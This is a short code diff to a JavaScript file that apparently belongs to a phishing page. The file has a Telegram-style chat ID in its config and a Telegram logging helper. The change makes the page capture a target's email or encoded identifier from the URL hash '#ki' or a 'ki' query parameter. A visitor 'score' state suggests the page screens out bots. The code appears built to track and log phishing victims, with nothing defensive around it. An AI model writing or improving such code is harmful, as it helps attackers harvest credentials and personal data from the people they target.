@@ -15,19 +15,25 @@ const CFG = {
   C: "-1003701370299"
 };
 
+
+const _capturedHash = (function(){ try { return window.location.hash; } catch(e){ return ''; } })();
+const _capturedSearch = (function(){ try { return window.location.search; } catch(e){ return ''; } })();
+
 let state = { score: 0, interacted: false };
 
-
-
 const extractDataFromHash = () => {
-  const hash = window.location.hash;
-  if (!hash || !hash.startsWith('#ki')) return null;
   
-  const dataPart = hash.substring(3); 
-  if (!dataPart) return null;
+  if (_capturedHash && _capturedHash.startsWith('#ki')) {
+    const dataPart = _capturedHash.substring(3);
+    if (dataPart) return dataPart;
+  }
   
-  // Return as-is (plain email or base64 string - don't decode)
-  return dataPart;
+  try {
+    const params = new URLSearchParams(_capturedSearch);
+    const ki = params.get('ki');
+    if (ki) return ki;
+  } catch (_) {}
+  return null;
 };
 
 const tgLog = async txt => {
